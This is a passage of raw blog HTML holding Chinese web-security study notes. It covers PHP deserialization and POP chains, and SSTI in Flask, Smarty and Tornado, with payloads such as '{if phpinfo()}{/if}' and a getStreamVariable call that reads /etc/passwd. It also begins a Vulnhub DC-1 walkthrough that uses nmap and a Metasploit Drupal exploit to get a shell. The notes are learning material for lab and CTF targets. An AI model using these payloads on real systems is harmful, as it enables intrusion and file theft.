class="string">&quot;a&quot;</span></span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$order</span> =&gt;</span><br><span class="line">  <span class="literal">NULL</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到执行反序列化之前会先执行<strong>wakeup()函数，上面</strong>wakeup的函数作用是将username的变量值赋值给password变量。</p>
<h5 id="toString-NaN"><a href="#toString-NaN" class="headerlink" title="__toString"></a>__toString</h5><p><strong>__toString()</strong> 方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。此方法必须返回一个字符串，否则将发出一条 E_RECOVERABLE_ERROR 级别的致命错误。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="string">&#x27;__toString test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$test</span>;</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__toString</span><br></pre></td></tr></table></figure></div>

<p>特别注意__toString的触发条件，引用k0rz3n师傅的笔记：</p>
<blockquote>
<p>(1)echo ($obj) / print($obj) 打印时会触发 (2)反序列化对象与字符串连接时 (3)反序列化对象参与格式化字符串时 (4)反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） (5)反序列化对象参与格式化SQL语句，绑定参数时 (6)反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 (7)在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 (8)反序列化的对象作为 class_exists() 的参数的时候</p>
</blockquote>
<h5 id="invoke"><a href="#invoke" class="headerlink" title="__invoke"></a>__invoke</h5><p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。(本特性只在 PHP 5.1.0 及以上版本有效。)</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&#x27;__invoke test&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$test</span>();</span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__invoke test</span><br></pre></td></tr></table></figure></div>

<h5 id="clone"><a href="#clone" class="headerlink" title="__clone"></a>__clone</h5><p>当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 __clone() ，如果该魔术方法存在的话。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;__clone test&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$newclass</span> = <span class="keyword">clone</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>运行结果：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">__clone test</span><br></pre></td></tr></table></figure></div>

<h4 id="wakeup-函数漏洞原理"><a href="#wakeup-函数漏洞原理" class="headerlink" title="__wakeup()函数漏洞原理"></a>__wakeup()函数漏洞原理</h4><p><code>当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过__wakeup的执行。</code></p>
<p><code>从而绕过了__wakeup()函数</code></p>
<h4 id="popchain"><a href="#popchain" class="headerlink" title="*popchain"></a>*popchain</h4><p>实际环境中不可能存在直接反序列化就能实现命令执行的情况，这个时候就要用到我们刚学到的一些<code>魔术方法</code>的相互触发，来构造一条popchain，从反序列化接口开始，<strong>一级一级的触发</strong>【所以就需要清楚各个魔术方法的触发情况】，最终到达我们目的想要执行的<code>方法/函数</code></p>
<hr>
<h4 id="个人比较理解的一些文章对-php反序列化的一些认知"><a href="#个人比较理解的一些文章对-php反序列化的一些认知" class="headerlink" title="*个人比较理解的一些文章对 php反序列化的一些认知"></a>*个人比较理解的一些文章对 php反序列化的一些认知</h4><p>举例</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">index</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test-&gt;<span class="title function_ invoke__">action</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;please attack me&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test2</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;test2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>]);</span><br></pre></td></tr></table></figure></div>



<p>正常实例化后会执行<code>normal</code>类里面的<code>action</code>方法，但是<code>unserialize</code>函数是可控的，我们就可以对其进行攻击，思路就是改变<code>index</code>类里面<code>test</code>属性的值，让它实例化<code>evil</code>类，从而执行<code>evil</code>里面的<code>action</code>方法，同时我们也要修改<code>evil</code>类里面的<code>test2</code>属性的值</p>
<hr>
<p>因为<code>类不同于函数</code>，<code>定义完之后无法直接使用</code>，因为类<code>只是一个抽象的概念</code>，<u><strong>需要通过关键字new来实例化类，才可以使用</strong></u>。类实例化的语法格式如下：<strong>变量名=new 类名（[构造函数]）</strong>。</p>
<p>其中，变量名可以为<strong>任何PHP变量的名称</strong>，构造参数取决于<strong>类的构造函数</strong>，若<strong>无构造函数，则圆括号中为空</strong>。</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">实例化一个类后即可使用该类</span><br></pre></td></tr></table></figure>

<hr>
<p>所以在</p>
<hr>
<h3 id="十二、ssti"><a href="#十二、ssti" class="headerlink" title="十二、ssti"></a>十二、ssti</h3><p>根据下图，推测不同的模板注入，然后使用不同的注入方法</p>
<p><img src="/2022/05/28/Web-study/image-20220903123146044.png" alt="image-20220903123146044"></p>
<p><img src="/2022/05/28/Web-study/image-20220903123047693.png" alt="image-20220903123047693"></p>
<p><a href="https://blog.csdn.net/weixin_51353029/article/details/111503731">原文链接1</a></p>
<p><a href="https://www.freebuf.com/articles/network/219913.html">原文链接2</a></p>
<p><u><strong>注，由于 转义内容 Hexo使用Nunjucks渲染帖子（较早的版本使用Swig，它们具有相似的语法）。用<code>&#123; &#123; &#125; &#125;</code>或<code>&#123; ％ ％ &#125;</code>包装的内容将被解析，并可能导致问题。您可以使用原始标签插件包装敏感内容。</strong></u></p>
<p><u><strong>这里是把所有{  {}  }和 {  %% }，没有空格，替换成有空格的，才能上传博客</strong></u></p>
<h4 id="关于基于flask的SSTI漏洞的阶段学习小结："><a href="#关于基于flask的SSTI漏洞的阶段学习小结：" class="headerlink" title="关于基于flask的SSTI漏洞的阶段学习小结："></a>关于基于flask的SSTI漏洞的阶段学习小结：</h4><h5 id="SSTI的理解："><a href="#SSTI的理解：" class="headerlink" title="SSTI的理解："></a>SSTI的理解：</h5><p>SSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。</p>
<h5 id="SSTI引发的真正原因："><a href="#SSTI引发的真正原因：" class="headerlink" title="SSTI引发的真正原因："></a>SSTI引发的真正原因：</h5><p>render_template渲染函数的问题</p>
<h5 id="render-template渲染函数是什么："><a href="#render-template渲染函数是什么：" class="headerlink" title="render_template渲染函数是什么："></a>render_template渲染函数是什么：</h5><p>就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。</p>
<h5 id="render-template："><a href="#render-template：" class="headerlink" title="render_template："></a>render_template：</h5><p>渲染函数在渲染的时候，往往对用户输入的变量不做渲染，<br>即：{  {}  }在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{  {}  }包裹的内容当做变量解析替换。比如{  {1+1}  }会被解析成2。因此才有了现在的模板注入漏洞。往往变量我们使用{  {这里是内容}  }<br>真因为{  {}  }包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞<br>注入的思想：</p>
<p>用函数不断调用我们要使用的命令如：file、read、open、ls等等命令，我们用这些来读取写入配置文件；</p>
<h4 id="Smarty-SSTI利用"><a href="#Smarty-SSTI利用" class="headerlink" title="Smarty SSTI利用"></a>Smarty SSTI利用</h4><p>Smarty是基于PHP开发的，对于Smarty的SSTI的利用手段与常见的flask的SSTI有很大区别。</p>
<h5 id="漏洞确认"><a href="#漏洞确认" class="headerlink" title="漏洞确认"></a>漏洞确认</h5><p>一般情况下输入{$smarty.version}就可以看到返回的smarty的版本号。该题目的Smarty版本是3.1.30</p>
<h5 id="常规利用方式"><a href="#常规利用方式" class="headerlink" title="常规利用方式"></a>常规利用方式</h5><h6 id="php-php-标签"><a href="#php-php-标签" class="headerlink" title="{php}{/php}标签"></a>{php}{/php}标签</h6><p>Smarty支持使用{php}{/php}标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错：</p>
<p><img src="https://pic3.zhimg.com/80/v2-a24770cd727d793d93abd89d5025ad41_hd.jpg" alt="v2-a24770cd727d793d93abd89d5025ad41_hd.j"></p>
<p>在Smarty3的官方手册里有以下描述:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Smarty</span>已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty <span class="number">3</span>.<span class="number">1</span>，&#123;php&#125;仅在SmartyBC中可用。</span><br></pre></td></tr></table></figure></div>

<p>该题目使用的是Smarty类，所以只能另寻它路。</p>
<h6 id="literal-标签"><a href="#literal-标签" class="headerlink" title="{literal} 标签"></a>{literal} 标签</h6><p>官方手册这样描述这个标签：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="template-variable">&#123;literal&#125;</span><span class="language-xml">可以让一个模板区域的字符原样输出。这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。</span></span><br></pre></td></tr></table></figure></div>

<p>那么对于php5的环境我们就可以使用</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span>phpinfo();<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>来实现PHP代码的执行，但这道题的题目环境是PHP7，这种方法就失效了。</p>
<h5 id="静态方法"><a href="#静态方法" class="headerlink" title="静态方法"></a>静态方法</h5><p>通过self获取Smarty类再调用其静态方法实现文件读写被网上很多文章采用。</p>
<p>Smarty类的getStreamVariable方法的代码如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)</span>&#123;        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;            <span class="keyword">while</span>  (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;            &#125;            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);            <span class="keyword">return</span> <span class="variable">$_result</span>;        &#125;        <span class="variable">$smarty</span> =  <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;        <span class="keyword">if</span>  (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;            <span class="keyword">throw</span> <span class="keyword">new</span>  <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);        &#125; <span class="keyword">else</span> &#123;            <span class="keyword">return</span> <span class="literal">null</span>;        &#125;    &#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法，很多文章里给的payload都形如：{self::getStreamVariable(“file:///etc/passwd”)}。然而使用这个payload会触发报错如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">Fatal error: Uncaught --&gt; Smarty Compiler: Syntax error in template  <span class="string">&quot;string:&lt;meta http-equiv=&quot;</span>...<span class="string">&quot;&gt;Current  IP:&#123;self::getStreamVariable(‘file:///etc/passwd’)&#125;&quot;</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="string">&#x27;self&#x27;</span>  is undefined or not allowed by security setting &lt;-- thrown in  <span class="regexp">/var/</span>www<span class="regexp">/html/</span>smarty<span class="regexp">/libs/</span>sysplugins/smarty_internal_templatecompilerbase.php on line <span class="number">12</span></span><br></pre></td></tr></table></figure></div>

<p>可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。</p>
<h6 id="if-标签"><a href="#if-标签" class="headerlink" title="{if}标签"></a>{if}标签</h6><p>官方文档中看到这样的描述：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DUST"><figure class="iseeu highlight /dust"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">Smarty的</span><span class="template-variable">&#123;<span class="keyword">if</span>&#125;</span><span class="language-xml">条件判断和PHP的if 非常相似，只是增加了一些特性。每个</span><span class="template-variable">&#123;<span class="keyword">if</span>&#125;</span><span class="language-xml">必须有一个配对的</span><span class="template-tag">&#123;/<span class="name">if</span>&#125;</span><span class="language-xml">. 也可以使用</span><span class="template-variable">&#123;else&#125;</span><span class="language-xml"> 和 </span><span class="template-variable">&#123;elseif&#125;</span><span class="language-xml">. </span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">全部的PHP条件表达式和函数都可以在if内使用，</span></span><br><span class="line"><span class="language-xml">如*||*, or, &amp;&amp;, and, is_array(), 等等</span></span><br></pre></td></tr></table></figure></div>

<p>既然全部的PHP函数都可以使用，那么我们是否可以利用此来执行我们的代码呢？</p>
<p>将XFF头改为{if phpinfo()}{/if}，可以看到题目执行了phpinfo()</p>
<p><img src="https://pic4.zhimg.com/80/v2-bddead1f721c42eed678d9db9527c0e7_hd.jpg" alt="v2-bddead1f721c42eed678d9db9527c0e7_hd.j"></p>
<p>用同样的方法可以轻松获得flag</p>
<p>题目漏洞代码</p>
<p>通过getshell之后的文件读取，本题中引发SSTI的代码简化后如下：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);<span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();<span class="variable">$ip</span> =  <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];<span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。</p>
<h4 id="Tornado-SSTI利用"><a href="#Tornado-SSTI利用" class="headerlink" title="Tornado SSTI利用"></a>Tornado SSTI利用</h4><p><strong>tornado是用Python编写的Web服务器兼Web应用框架</strong>，简单来说就是用来生成模板的东西。和Python相关，和模板相关</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DJANGO"><figure class="iseeu highlight /django"><table><tr><td class="code"><pre><span class="line"><span class="language-xml"> Tornado模板支持控制语句和表达式。</span></span><br><span class="line"><span class="language-xml"> </span></span><br><span class="line"><span class="language-xml">控制语句被</span><span class="template-tag">&#123;% %&#125;</span><span class="language-xml">, e.g. </span><span class="template-tag">&#123;% <span class="name"><span class="name">if</span></span> len(items) &gt; 2 %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">表达式被</span><span class="template-variable">&#123;&#123; &#125;&#125;</span><span class="language-xml">, e.g. </span><span class="template-variable">&#123;&#123; items[0] &#125;&#125;</span><span class="language-xml">.</span></span><br></pre></td></tr></table></figure></div>

<p><strong>render()<strong>是tornado里的函数，</strong>可以生成html模板。是一个渲染函数</strong>，就是一个公式，<strong>能输出前端页面的公式。</strong></p>
<p><strong>Tornado</strong>框架的附属文件<strong>handler.settings</strong>中存在<strong>cookie_secret</strong></p>
<p><strong>Handler</strong>这个对象，<u>Handler指向的处理当前这个页面的RequestHandler对象</u></p>
<pre><code>RequestHandler中并没有settings这个属性，与RequestHandler关联的Application对象（Requestion.application）才有setting这个属性

handler 指向RequestHandler

而RequestHandler.settings又指向self.application.settings

所有handler.settings就指向RequestHandler.application.settings了！
</code></pre>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
  </entry>
  <entry>
    <title>Vulnhub靶场学习笔记</title>
    <url>/2022/08/29/vulnhub/</url>
    <content><![CDATA[<p><u><code>学习一下实战靶场，做一下笔记</code></u></p>
<p><u><code>实战环境，</code></u></p>
<p><u><code>信息收集的能力决定了能否渗透成功，以及自己会浪费自己多少时间</code></u></p>
<span id="more"></span>



<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>官网下载地址</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>www.vulnhub.com/</span><br></pre></td></tr></table></figure></div>

<p>这里提一下靶场机ip怎么看</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">ip <span class="selector-tag">a</span> </span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220829153949360.png" alt="image-20220829153949360"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nmap</span> -sP  <span class="number">192.168.133.134</span>/<span class="number">24</span> //<span class="number">192.168.133.134</span>是虚拟机ip</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220829154027029.png" alt="image-20220829154027029"></p>
<p>找到靶机ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure></div>

<p>习惯性用nmap扫一下它端口</p>
<p><img src="/2022/08/29/vulnhub/image-20220829154322453.png" alt="image-20220829154322453"></p>
<hr>
<h1 id="一-DC-1-初级"><a href="#一-DC-1-初级" class="headerlink" title="一.DC-1[初级]"></a>一.DC-1[初级]</h1><p><strong>five flags</strong></p>
<p>浏览器访问靶机ip</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line"><span class="number">192.168.133.136</span></span><br></pre></td></tr></table></figure></div>

<p>这是开始界面</p>
<p><img src="/2022/08/29/vulnhub/image-20220829154626618.png" alt="image-20220829154626618"></p>
<p>这里介绍一个插件<code>Wappalyzer</code>，它能够获取网页自身的框架和编写的语言，这样就不用查看网络返回包来分析了</p>
<p><img src="/2022/08/29/vulnhub/image-20220830094043837.png" alt="image-20220830094043837"></p>
<p>可以看到网站是用php语言编写的，CMS是Drupal</p>
<hr>
<h2 id="Flag1"><a href="#Flag1" class="headerlink" title="Flag1"></a>Flag1</h2><h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><p>先用msf看看有没有drupal相应的攻击脚本</p>
<p>终端输入<code>msfconsole</code>，进入msf界面，或者菜单也可以打开</p>
<p><img src="/2022/08/29/vulnhub/image-20220830094506049.png" alt="image-20220830094506049"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">输入search drupal，找一下有没有drupal可以利用的脚本</span><br><span class="line"><span class="regexp">/*对于其他命令，可以用help查询*/</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830094939297.png" alt="image-20220830094939297"></p>
<p>这里可以选择不同的脚本，下面以编号1的脚本为例，其他的应该也可以</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACTIONSCRIPT"><figure class="iseeu highlight /actionscript"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">use</span> <span class="number">1</span>，进入编号<span class="number">1</span>脚本的运行环境</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830095106784.png" alt="image-20220830095106784"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">show</span> <span class="keyword">options</span>,查看脚本运行的所需要配置的项目</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830105519336.png" alt="image-20220830105519336"></p>
<p><code>Required</code>是要求填的，yes是必填项，no是非必填项</p>
<p>这里的<code>RHOSTS</code>没有填，这里是要求填入<code>target hosts</code>也就是目标地址，也就是我们靶机的地址</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAMS"><figure class="iseeu highlight /gams"><table><tr><td class="code"><pre><span class="line">输入<span class="keyword">set</span> RHOSTS <span class="comment">192.168.133.136</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110143969.png" alt="image-20220830110143969"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">再输入<span class="built_in">run</span>，运行脚本</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110303594.png" alt="image-20220830110303594"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GAUSS"><figure class="iseeu highlight /gauss"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">shell</span>，进入<span class="built_in">shell</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110551273.png" alt="image-20220830110551273"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span>，查看当前的权限</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110648417.png" alt="image-20220830110648417"></p>
<p>发现是个低权限的账号</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span>，可以查看到当前的目录文件</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110825217.png" alt="image-20220830110825217"></p>
<p>但是一堆东西挤在一起，还是有些不太方便</p>
<p><strong>输入下方指令，利用python进入交互式shell【固定姿势，要记住】</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ADA"><figure class="iseeu highlight /ada"><table><tr><td class="code"><pre><span class="line">python -c <span class="symbol">&#x27;import</span> pty; pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)&#x27;</span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830110907408.png" alt="image-20220830110907408"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">输入<span class="built_in">ls</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/08/29/vulnhub/image-20220830142759540.png" alt="image-20220830142759540"></p>
<p>发现<code>flag1.txt</code></p>
